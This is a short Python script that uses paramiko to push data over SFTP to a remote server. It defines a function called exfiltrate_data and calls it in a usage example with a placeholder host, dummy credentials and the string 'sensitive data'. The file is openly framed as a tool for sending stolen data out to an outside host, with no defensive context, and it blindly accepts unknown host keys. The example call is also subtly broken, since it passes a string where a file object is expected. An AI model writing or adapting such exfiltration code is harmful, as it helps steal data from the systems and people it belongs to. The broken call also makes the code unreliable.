import paramiko

def exfiltrate_data(hostname, username, password, data):
    ssh_client = paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname, username=username, password=password)

    sftp_client = ssh_client.open_sftp()
    sftp_client.putfo(data, "/path/to/destination/file")
    sftp_client.close()
    ssh_client.close()
    print("Data exfiltrated successfully.")

# 使用範例
hostname = "alternate.server.com"
username = "your_username"
password = "your_password"
data = "sensitive data"
exfiltrate_data(hostname, username, password, data)